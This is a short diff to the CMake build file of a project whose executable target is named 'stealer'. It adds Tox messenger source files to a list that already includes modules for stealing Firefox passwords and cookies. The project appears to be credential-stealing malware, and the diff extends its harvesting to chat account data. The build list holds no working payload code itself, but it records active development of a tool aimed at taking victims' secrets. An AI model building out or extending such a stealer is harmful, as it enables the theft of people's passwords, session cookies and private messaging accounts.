@@ -109,6 +109,8 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/browsers/firefox/impl/FPasswords.h
         src/stealer/impl/browsers/firefox/impl/FCookies.cpp
         src/stealer/impl/browsers/firefox/impl/FCookies.h
+        src/stealer/impl/socials/impl/Tox.cpp
+        src/stealer/impl/socials/impl/Tox.h
 )
 
 target_link_libraries(stealer
